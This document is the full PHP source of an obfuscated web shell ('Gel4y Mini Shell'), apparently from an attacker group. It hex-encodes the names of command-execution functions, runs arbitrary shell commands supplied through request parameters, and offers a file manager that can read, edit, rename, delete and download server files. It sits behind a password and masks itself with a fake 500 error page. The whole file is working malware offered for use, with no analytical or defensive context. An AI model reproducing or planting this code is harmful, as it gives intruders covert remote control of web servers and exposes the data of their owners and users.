<?php
#error_reporting(0);
define("SELF", "Gel4y Mini Shell");

$k = "secret";
$R = array_merge($_GET, $_POST);
$fc = array("s\x63\x61\x6e\x64\x69r", "strlen");
$turn = function ($str, $act = true, $i = 0) {
   $res = "";
   $strLen = $GLOBALS["fc"][1]($str);
   switch ($act) {
      case false:
         for (; $i < $strLen; $i++)
            $res .= dechex(ord($str[$i]));
         break;
      case true:
         for (; $i < ($strLen - 1); $i += 2)
            $res .= chr(hexdec("{$str[$i]}{$str[$i+1]}"));
         break;
   }

   return $res;
};

$func = array(
   "7068705f756e616d65",
   "70687076657273696f6e", "676574637764",
   "6368646972", "707265675f73706c6974", "61727261795f64696666",
   "69735f646972", "69735f66696c65", "69735f7772697461626c65",
   "69735f7265616461626c65", "66696c6573697a65",
   "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473",
   "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65",
   "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465",
   "66696c656d74696d65", "66696c657065726d73", "73657373696f6e5f7374617274",
   "626173656e616d65", "666f70656e", "66656f66", "6672656164", "66636c6f7365",
   "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563",
   "6f625f7374617274", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e");
foreach ($func as $i => $v) $func[$i] = $turn($func[$i]);

#die(var_dump($func));
@$func[22]();
if (isset($R["p"])) {
   $p = $turn($R["p"]);
   $func[3]($turn($R["p"]));
} else {
   $p = $func[2]();
}

function a($sts = 1, $loc = "") {
   global $p, $turn;
   $status = (($sts == 1) ? "success" : "error");
   echo "<script>swal({title: \"{$status}\", text: \"\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".$turn($p, 0).$loc."\"}})</script>";
}

function ps($f) {
   global $func;
   $p = $func[21]($f);
   if (($p & 0xC000) == 0xC000) $i = "s";
   elseif (($p & 0xA000) == 0xA000) $i = "l";
   elseif (($p & 0x8000) == 0x8000) $i = "-";
   elseif (($p & 0x6000) == 0x6000) $i = "b";
   elseif (($p & 0x4000) == 0x4000) $i = "d";
   elseif (($p & 0x2000) == 0x2000) $i = "c";
   elseif (($p & 0x1000) == 0x1000) $i = "p";
   else $i = "u";

   $i .= (($p & 0x0100) ? "r" : "-");
   $i .= (($p & 0x0080) ? "w" : "-");
   $i .= (($p & 0x0040) ? (($p & 0x0800) ? "s" : "x") : (($p & 0x0800) ? "S" : "-"));
   $i .= (($p & 0x0020) ? "r" : "-");
   $i .= (($p & 0x0010) ? "w" : "-");
   $i .= (($p & 0x0008) ? (($p & 0x0400) ? "s" : "x") : (($p & 0x0400) ? "S" : "-"));
   $i .= (($p & 0x0004) ? "r" : "-");
   $i .= (($p & 0x0002) ? "w" : "-");
   $i .= (($p & 0x0001) ? (($p & 0x0200) ? "t" : "x") : (($p & 0x0200) ? "T" : "-"));
   return $i;
}

function exe($sc) {
   global $func;
   if (function_exists($func[28])) {
      @$func[32]();
      @$func[28]($sc);
      $r = @$func[33]();
      @$func[34]();
      return $r;
   } elseif (function_exists($func[29])) {
      @$func[29]($sc, $results);
      $r = "";
      foreach ($results as $result) {
         $r .= $result;
      } return $r;
   } elseif (function_exists($func[30])) {
      @$func[32]();
      @$func[30]($sc);
      $r = @$func[33]();
      @$func[34]();
      return $r;
   } elseif (function_exists($func[31])) {
      $r = @$func[31]($sc);
      return $r;
   }
}

if (!isset($_SESSION[md5($_SERVER["HTTP_HOST"])]))
   if (empty($k) or (isset($R["k"]) and ($R["k"] == $k)))
      $_SESSION[md5($_SERVER["HTTP_HOST"])] = true;
else
   #lmao();
   die(header($_SERVER["SERVER_PROTOCOL"]." 500 Internal Server Error"));

?>
<!doctype html>
<html lang="en">
<head>
   <meta charset="utf-8">
   <meta name="theme-color" content="red">
   <meta name="viewport" content="width=device-width, initial-scale=0.65, shrink-to-fit=no">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/monokai-sublime.min.css">
   <link rel="stylesheet" href="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/css/TextareaLine.min.css">
   <title><?= bin2hex(rand()); ?></title>
   <style>
      body {
         color: #fff;
         font-family: serif;
         background-color: #000;
      }
      .self a {
         font-size: 26px;
         font-weight: bold;
         letter-spacing: 1.5px;
         font-variant: small-caps;
         margin-top: .3rem !important;
      }
      .self span {
         font-size: 11px;
         margin-left: 3.4px;
      }
      blockquote {
         margin: 0px 0px 8px 0px;
         padding: .5rem 1rem;
         background-color: #282828;
         font-weight: bold;
         border-left: 5px solid red;
      }
      #editor {
         background-color: white;
         border: 1px solid black;
         position: relative;
         height: 300px;
      }
      .table-hover tbody tr:hover td {
         background: red
      }
      .table > tbody > tr > * {
         color: #fff;
         vertical-align: middle
      }
      input:focus, textarea:focus {
         outline: none;
         box-shadow: none;
      }
      li {
         list-style: none;
      }
      li span {
         font-weight: bold;
      }
      a {
         color: #fff;
      }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
   <script src="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/js/TextareaLine.min.js"></script>
   <script>
      hljs.initHighlightingOnLoad();
   </script>
</head>
<body onload="TextareaLine.appendLineNumber('Editor');">
   <div class="">
      <section class="bg-dark border p-1">
         <div class="d-flex justify-content-between">
            <div class="self">
               <a href="?"><?= SELF ?></a><span>©22XploiterCrew</span>
            </div>
            <div>
               <span>PHP version: <?= $func[1]() ?></span><br />
               <a href="?p=<?=$p?>&a=file">+File</a>
               <a href="?p=<?=$p?>&a=file">+Folder</a>
               <a href="" class="float-right"><i class="fa fa-fw fa-upload"></i></a>
            </div>
         </div>
         <div class="border-top">
            <li><span>Server / System</span>: <?= "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]}) / {$func[0]("s")}" ?></li>
            <li>
               <form method="post">
                  <span><?= get_current_user()."@{$_SERVER["SERVER_NAME"]}:{$func[23]($p)}" ?>$</span>
                  <input type="text" size="20" height="5" name="sc" id="c" class="bg-transparent rounded-0 border-0 text-light" autocomplete="off" autofocus="autofocus">
               </form>
            </li>
         </div>
      </section>
      <section class="bg-dark border table-responsive my-1 p-1">
         <table>
            <tr>
               <td align="left">Path: </td>
               <td align="right">
                  <?php
                  $ps = $func[4]("/(\\\|\/)/", $p);
                  foreach ($ps as $key => $value) {
                     if ($key == 0 and $value == "") {
                        echo "<a href=\"?p=2f\">~</a>/"; continue;
                     }
                     if ($value == "") continue;
                     echo "<a href=\"?p=";
                     for ($i = 0; $i <= $key; $i++) {
                        echo $turn($ps[$i], 0);
                        if ($key !== $i) echo "2f";
                     }
                     echo "\">$value</a>/";
                  }
                  ?>
               </td>
            </tr>
         </table>
      </section>

      <section class="bg-dark border table-responsive">
         <?php if (isset($R["sc"])): ?>
         <blockquote>Command</blockquote>
         <div class="px-2">
            <pre><code class="bash"><?= exe($R["sc"]) ?></code></pre>
         </div>
         <?php endif; ?>
         <?php if (!isset($R["a"]) and !isset($R["sc"])) :if (is_readable($p)): ?>
         <table class="table table-sm table-hover table-borderless text-light">
            <thead class="bg-danger">
               <tr>
                  <th>Name</th>
                  <th>Size</th>
                  <th>Permission</th>
                  <th>Action</th>
               </tr>
            </thead>
            <tbody>
               <?php
               $scD = $func[5]($fc[0]($p), [".", ".."]);
               foreach ($scD as $d) {
                  if (!$func[6]("$p/$d")) continue;
                  $skrng = "$p/$d";
                  echo "<tr><td><a href=\"?p={$turn($skrng,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$skrng"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($func[8]("$skrng")) ? "#00ff00" : (!$func[9]("$skrng") ? "red" : null))."\">".ps("$skrng")."</font></td><td><a href=\"?p={$turn($p,0)}&a=72656e616d65&n={$turn($d,0)}&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p={$turn($p,0)}&a=64656c657465&n={$turn($d,0)}\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
               }
               foreach ($scD as $f) {
                  if (!$func[7]("$p/$f")) continue;
                  $sz = $func[10]("$p/$f")/1024;
                  $sz = round($sz, 3);
                  $sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
                  echo "<tr><td><a href=\"?p={$turn($p,0)}&a=76696577&n={$turn($f,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($func[8]("$p/$f")) ? "#00ff00" : (!$func[9]("$p/$f") ? "red" : null))."\">".ps("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p={$turn($p,0)}&a=65646974&n={$turn($f,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p={$turn($p,0)}&a=72656e616d65&n={$turn($f,0)}&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p={$turn($p,0)}&n={$turn($f,0)}&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p={$turn($p,0)}&a=64656c657465&n={$turn($f,0)}\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
               }
               ?>
            </tbody>
         </table>
         <?php else: echo("<div class=\"text-center\">Can't read directory</div>"); endif; endif; if (isset($R["a"])): $a = $turn($R["a"]); echo "<blockquote>".ucwords($a) . ((isset($R["t"]) ? ($R["t"] == "d" ? " folder" : " file") : null))."</blockquote><div class=\"px-2\">" . (!isset($R["t"])? "<span>Name: {$turn($R["n"])}</span>" : null) . "<form method=\"post\">" ?>
            <?php if ($a == "view"): ?>
            <div class="form-group">
               <pre class=""><code class="lang-<?= pathinfo($R["n"], PATHINFO_EXTENSION) ?>"><?php
                  $fp = $func[24]($turn($R["n"]), 'r');
                  if ($fp) {
                     while (!@$func[25]($fp))
                        echo $func[18](@$func[26]($fp, 1024));
                     @$func[27]($fp);
                  }
                  ?>
               </code></pre>
            </div>
            <?php elseif ($a == "rename"): ?>
            <div class="form-group"><label for="n">Name:</label><input type="text" name="nm" id="n" class="form-control bg-transparent rounded-0 text-light" value="<?= $turn($R["n"]) ?>"><div class="form-group mt-3"><button name="s" type="submit" class="btn btn-outline-light rounded-0">Save</button></div></div>
            <?php ((isset($R["s"])) ? ($func[16]($p.'/'.$turn($R["n"]), $R["nm"]) ? a() : a(0)) : null);  elseif ($a == "edit"): ?>
               <div id="editor">
                  <textarea name="ctn" id="Editor"><?php
                     $fp = $func[24]($turn($R["n"]), 'r');
                     if ($fp) while (!@$func[25]($fp)) echo $func[18](@$func[26]($fp, 1024));
                     @$func[27]($fp);
                  ?></textarea>
               </div>
               <div class="form-group mt-3">
                  <button name="s" type="submit" class="btn btn-block btn-outline-light rounded-0">Save</button>
               </div>
            <?php ((isset($R["s"])) ? ($func[13]($p.'/'.$turn($R["n"]), $R["ctn"]) ? a(1, "&a=76696577&n={$R["n"]}") : a()) : null); elseif($a == "a"): ?>
            <?php endif; endif; echo "</form></div>"; ?>
      </section>
      <section class="bg-dark border text-center mt-2">
         <span>Powered by Marijuana - Code by T1kus_g0t a.k.a RandsX</span>
      </section>
   </div>
   <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>